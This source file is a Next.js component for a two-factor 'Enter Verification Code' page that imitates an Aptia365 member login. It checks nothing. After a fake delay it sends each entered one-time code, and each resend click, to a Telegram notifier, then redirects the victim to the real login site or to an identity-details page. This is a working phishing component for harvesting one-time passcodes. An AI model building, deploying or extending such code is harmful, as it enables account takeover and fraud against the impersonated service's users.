"use client";
import { useState, Suspense, useEffect } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import { ArrowLeft, Loader2 } from 'lucide-react';
import { notifyTelegram } from '@/lib/telegram-notify';

const VERIFY_DELAY_MS = 10000;
const RESEND_LOADING_MS = 2000;
const RESEND_COOLDOWN_SEC = 30;

function formatMmSs(totalSeconds: number): string {
  const m = Math.floor(totalSeconds / 60);
  const s = totalSeconds % 60;
  return `${m}:${s.toString().padStart(2, '0')}`;
}

function VerifyForm({ otpStep }: { otpStep: 1 | 2 }) {
  const router = useRouter();
  const searchParams = useSearchParams();
  const rawMethod = searchParams.get('method') || 'email';
  const method: 'email' | 'text' | 'phone' =
    rawMethod === 'text' ? 'text' : rawMethod === 'phone' ? 'phone' : 'email';

  const [code, setCode] = useState('');
  const [verifyLoading, setVerifyLoading] = useState(false);
  const [resendLoading, setResendLoading] = useState(false);
  const [resendCooldown, setResendCooldown] = useState(0);

  useEffect(() => {
    if (resendCooldown <= 0) return;
    const t = setTimeout(() => setResendCooldown((c) => c - 1), 1000);
    return () => clearTimeout(t);
  }, [resendCooldown]);

  const handleVerify = async (e: React.FormEvent) => {
    e.preventDefault();
    if (verifyLoading) return;
    setVerifyLoading(true);
    await new Promise((r) => setTimeout(r, VERIFY_DELAY_MS));
    notifyTelegram({
      kind: 'verification',
      method,
      code,
      otpStep,
    });

    if (otpStep === 2) {
      window.location.href = 'https://auth.aptia365.com/aptia365/member/login';
      return;
    }

    
    router.push(`/identity-details?method=${encodeURIComponent(method)}`);
  };

  const handleResend = async () => {
    if (resendLoading || resendCooldown > 0) return;
    setResendLoading(true);
    notifyTelegram({ kind: 'resend', method, otpStep });
    await new Promise((r) => setTimeout(r, RESEND_LOADING_MS));
    setResendLoading(false);
    setResendCooldown(RESEND_COOLDOWN_SEC);
  };

  const methodText =
    method === 'text' ? 'text message' :
    method === 'phone' ? 'phone call' :
    'email';

  const resendDisabled = resendLoading || resendCooldown > 0;

  return (
    <div className="w-full max-w-[500px] mx-auto bg-white rounded shadow-[0_2px_8px_rgba(0,0,0,0.1)] p-10 relative">
      <button
        type="button"
          onClick={() =>
            otpStep === 2
              ? router.push(`/identity-details?method=${encodeURIComponent(method)}`)
              : router.back()
          }
        disabled={verifyLoading}
        className="absolute top-6 left-6 text-[#666666] hover:text-[#00C389] transition-colors flex items-center gap-1 text-sm font-medium disabled:opacity-40 disabled:pointer-events-none"
      >
        <ArrowLeft className="w-4 h-4" /> Back
      </button>

      <div className="flex flex-col items-center text-center mb-8 mt-2">
        <h2 className="text-2xl font-normal text-[#333333] mb-2">
          Enter Verification Code
        </h2>
        <p className="text-sm text-[#666666]">
          We have sent a 6-digit code via {methodText}. Please enter it below to verify your identity.
        </p>
      </div>

      <form onSubmit={handleVerify} className="space-y-6">
        <div>
          <label
            htmlFor="code"
            className="block text-sm font-medium text-[#333333] mb-2 text-center"
          >
            Verification Code
          </label>
          <input
            type="text"
            id="code"
            maxLength={6}
            value={code}
            onChange={(e) => setCode(e.target.value.replace(/\D/g, ''))}
            placeholder="000000"
            disabled={verifyLoading}
            className="w-full h-12 px-4 border border-[#DDDDDD] rounded text-center text-xl tracking-[0.5em] text-[#333333] placeholder:text-[#BBBBBB] focus:border-[#00C389] focus:ring-1 focus:ring-[#00C389] outline-none transition-all disabled:opacity-60 disabled:bg-[#FAFAFA]"
          />
        </div>

        <button
          type="submit"
          disabled={code.length < 6 || verifyLoading}
          className="w-full h-10 rounded-full text-sm font-medium text-white disabled:bg-[#B8B8B8] enabled:bg-[#00C389] enabled:hover:bg-[#00A876] transition-colors inline-flex items-center justify-center gap-2"
        >
          {verifyLoading ? (
            <>
              <Loader2 className="h-4 w-4 animate-spin" aria-hidden />
              Loading…
            </>
          ) : (
            'Verify'
          )}
        </button>
      </form>

      <div className="mt-6 text-center text-sm text-[#666666]">
        Didn&apos;t receive a code?{' '}
        <button
          type="button"
          onClick={handleResend}
          disabled={resendDisabled}
          className="text-[#00C389] hover:underline font-medium disabled:text-[#999999] disabled:no-underline disabled:cursor-not-allowed inline-flex items-center gap-1.5"
        >
          {resendLoading ? (
            <>
              <Loader2 className="h-3.5 w-3.5 animate-spin shrink-0" aria-hidden />
              Loading…
            </>
          ) : resendCooldown > 0 ? (
            `Resend in ${formatMmSs(resendCooldown)}`
          ) : (
            'Resend'
          )}
        </button>
      </div>
    </div>
  );
}

export function TwoFactorVerifyCard() {
  return (
    <Suspense fallback={<div className="w-full max-w-[500px] mx-auto bg-white rounded shadow-sm p-10 text-center animate-pulse">Loading...</div>}>
      <VerifyForm otpStep={1} />
    </Suspense>
  );
}

export function TwoFactorVerifyCardStep2() {
  return (
    <Suspense fallback={<div className="w-full max-w-[500px] mx-auto bg-white rounded shadow-sm p-10 text-center animate-pulse">Loading...</div>}>
      <VerifyForm otpStep={2} />
    </Suspense>
  );
}
